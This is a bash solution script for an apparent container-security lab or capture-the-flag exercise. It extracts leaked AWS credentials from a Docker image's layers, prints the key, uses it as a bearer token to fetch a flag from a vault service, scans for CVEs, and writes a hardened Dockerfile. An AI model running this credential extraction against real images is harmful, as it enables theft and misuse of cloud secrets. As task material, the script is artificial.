#!/bin/bash
set -u
cd "$HOME"

echo "=== [1/5] docker history (Task 1) ==="
docker history --no-trunc internal-app:1.0 | tee ~/findings.txt

echo "=== [2/5] docker save + extract layers (Task 2) ==="
docker save internal-app:1.0 -o ~/image.tar
rm -rf ~/layers && mkdir -p ~/layers && tar -xf ~/image.tar -C ~/layers
cd ~/layers
for l in blobs/sha256/*; do
    if tar -tf "$l" 2>/dev/null | grep -q '^app/secrets/aws-credentials.txt$'; then
        echo "credential found in layer: $l"
        tar -xf "$l" app/secrets/aws-credentials.txt
    fi
done
cd ~
cat ~/layers/app/secrets/aws-credentials.txt
awk -F'= *' '/aws_access_key_id/ {print $2}' ~/layers/app/secrets/aws-credentials.txt | tr -d '\r ' > ~/secret.txt
echo "secret: $(cat ~/secret.txt)"

echo "=== [3/5] trivy (Task 3) ==="
trivy image --offline-scan --severity HIGH,CRITICAL internal-app:1.0 | tee ~/cve-report.txt | grep -E '^Total|^internal-app'

echo "=== [4/5] get flag from vault-svc (Task 4) ==="
curl -s -H "Authorization: Bearer $(cat ~/secret.txt)" http://vault-svc:8080/flag | jq -r .flag | tee ~/flag_result.txt

echo "=== [5/5] hardening (Task 5) ==="
cat > ~/Dockerfile.secure <<'EOF'
FROM python:3.8.0-slim AS build
WORKDIR /src
COPY app-src/ /src/

FROM python:3.8.0-slim
WORKDIR /app
COPY --from=build /src/app.py /src/requirements.txt /app/
RUN useradd -r -u 10001 appuser && chown -R appuser /app
USER appuser
EXPOSE 5000
CMD ["python", "app.py"]
EOF
cat > ~/.dockerignore <<'EOF'
*
!app-src/
.env
secrets/
EOF
docker build --network none -f Dockerfile.secure -t internal-app:secure .
docker history internal-app:secure
